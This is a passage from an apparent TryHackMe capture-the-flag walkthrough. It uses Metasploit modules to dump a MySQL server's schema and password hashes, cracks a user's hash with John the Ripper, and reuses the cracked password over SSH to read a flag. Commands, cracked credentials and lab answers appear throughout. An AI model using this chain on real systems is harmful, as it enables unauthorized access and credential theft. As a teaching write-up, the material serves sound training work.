msf6 auxiliary(admin/mysql/mysql_sql) > exploit 
[*] Running module against 10.10.39.195

[*] 10.10.39.195:3306 - Sending statement: 'SHOW DATABASES'...
[*] 10.10.39.195:3306 -  | information_schema |
[*] 10.10.39.195:3306 -  | mysql |
[*] 10.10.39.195:3306 -  | performance_schema |
[*] 10.10.39.195:3306 -  | sys |
[*] Auxiliary module execution completed
```
**4** databases.



## Exploiting MySQL
#### Recap
Let's take a sanity check before moving on to try and exploit the database fully, and gain more sensitive information than just database names. We know:
1. MySQL server credentials
1. The version of MySQL running
1. The number of Databases, and their names.

#### Key Terminology
In order to understand the exploits we're going to use next- we need to understand a few key terms.
- **Schema**: In MySQL, physically, a schema is synonymous with a database. You can substitute the keyword "SCHEMA" instead of DATABASE in MySQL SQL syntax, for example using CREATE SCHEMA instead of CREATE DATABASE. It's important to understand this relationship because some other database products draw a distinction. For example, in the Oracle Database product, a schema represents only a part of a database: the tables and other objects owned by a single user.
- **Hashes**: Hashes are, very simply, the product of a cryptographic algorithm to turn a variable length input into a fixed length output. In MySQL hashes can be used in different ways, for instance to index data into a hash table. Each hash has a unique ID that serves as a pointer to the original data. This creates an index that is significantly smaller than the original data, allowing the values to be searched and accessed more efficiently. However, the data we're going to be extracting are password hashes which are simply a way of storing passwords not in plaintext format.

#### Answer
First, let's search for and select the "mysql_schemadump" module. What's the module's full name?
```bash
msf6 auxiliary(admin/mysql/mysql_sql) > search mysql_schemadump

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  auxiliary/scanner/mysql/mysql_schemadump                   normal  No     MYSQL Schema Dump


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/mysql/mysql_schemadump 
```
It's **auxiliary/scanner/mysql/mysql_schemadump**.

Great! Now, you've done this a few times by now so I'll let you take it from here. Set the relevant options, run the exploit. What's the name of the last table that gets dumped?
```bash
msf6 auxiliary(scanner/mysql/mysql_schemadump) > exploit
...
    ColumnType: bigint(20) unsigned
    - ColumnName: avg_latency
      ColumnType: bigint(20) unsigned
    - ColumnName: max_latency
      ColumnType: bigint(20) unsigned
  - TableName: x$waits_global_by_latency
    Columns:
    - ColumnName: events
      ColumnType: varchar(128)
    - ColumnName: total
      ColumnType: bigint(20) unsigned
    - ColumnName: total_latency
      ColumnType: bigint(20) unsigned
    - ColumnName: avg_latency
      ColumnType: bigint(20) unsigned
    - ColumnName: max_latency
      ColumnType: bigint(20) unsigned

[*] 10.10.39.195:3306     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
It's **x$waits_global_by_latency**.

Awesome, you have now dumped the tables, and column names of the whole database. But we can do one better... search for and select the "mysql_hashdump" module. What's the module's full name?
```bash
msf6 auxiliary(scanner/mysql/mysql_schemadump) > search mysql_hashdump

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  auxiliary/analyze/crack_databases                        normal  No     Password Cracker: Databases
   1  auxiliary/scanner/mysql/mysql_hashdump                   normal  No     MYSQL Password Hashdump


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/mysql/mysql_hashdump
```
It's **auxiliary/scanner/mysql/mysql_hashdump**.

Again, I'll let you take it from here. Set the relevant options, run the exploit. What non-default user stands out to you?
```bash
msf6 auxiliary(scanner/mysql/mysql_schemadump) > use 1
msf6 auxiliary(scanner/mysql/mysql_hashdump) > options 

Module options (auxiliary/scanner/mysql/mysql_hashdump):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        The password for the specified username
   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     3306             yes       The target port (TCP)
   THREADS   1                yes       The number of concurrent threads (max one per host)
   USERNAME                   no        The username to authenticate as

msf6 auxiliary(scanner/mysql/mysql_hashdump) > set PASSWORD password
PASSWORD => password
msf6 auxiliary(scanner/mysql/mysql_hashdump) > set USERNAME root
USERNAME => root
msf6 auxiliary(scanner/mysql/mysql_hashdump) > set THREADS 16
THREADS => 16
msf6 auxiliary(scanner/mysql/mysql_hashdump) > set RHOSTS 10.10.39.195
RHOSTS => 10.10.39.195
msf6 auxiliary(scanner/mysql/mysql_hashdump) > exploit 

[+] 10.10.39.195:3306     - Saving HashString as Loot: root:
[+] 10.10.39.195:3306     - Saving HashString as Loot: mysql.session:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.39.195:3306     - Saving HashString as Loot: mysql.sys:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.39.195:3306     - Saving HashString as Loot: debian-sys-maint:*D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E
[+] 10.10.39.195:3306     - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
[+] 10.10.39.195:3306     - Saving HashString as Loot: carl:*EA031893AA21444B170FC2162A56978B8CEECE18
[*] 10.10.39.195:3306     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
It's **carl**.

Another user! And we have their password hash. This could be very interesting. Copy the hash string in full, like: bob:*HASH to a text file on your local machine called "hash.txt". What is the user/hash combination string?
- **carl:*EA031893AA21444B170FC2162A56978B8CEECE18**.

Now, we need to crack the password! Let's try John the Ripper against it using: "john hash.txt" what is the password of the user we found?
```bash
$ john hash.txt 
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (mysql-sha1, MySQL 4.1+ [SHA1 128/128 AVX 4x])
Warning: no OpenMP support for this hash type, consider --fork=4
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Further messages of this type will be suppressed.
To see less of these warnings, enable 'RelaxKPCWarningCheck' in john.conf
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
Warning: Only 2 candidates left, minimum 4 needed for performance.
Proceeding with incremental:ASCII
doggie           (carl)
1g 0:00:00:00 DONE 3/3 (2021-01-07 04:03) 1.492g/s 3412Kp/s 3412Kc/s 3412KC/s doggie..doggin
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
It's **doggie**.

Awesome. Password reuse is not only extremely dangerous, but extremely common. What are the chances that this user has reused their password for a different service? What's the contents of MySQL.txt
```bash
$ ssh carl@10.10.39.195                                        

carl@10.10.39.195 password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-96-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jan  7 09:05:03 UTC 2021

  System load:  0.0               Processes:           87
  Usage of /:   41.7% of 9.78GB   Users logged in:     0
  Memory usage: 32%               IP address for eth0: 10.10.39.195
  Swap usage:   0%


23 packages can be updated.
0 updates are security updates.


Last login: Thu Apr 23 12:57:41 2020 from 192.168.1.110
carl@polomysql:~$ ls
MySQL.txt
carl@polomysql:~$ cat MySQL.txt 
THM{congratulations_you_got_the_mySQL_flag}
```
The flag is **THM{congratulations_you_got_the_mySQL_flag}**.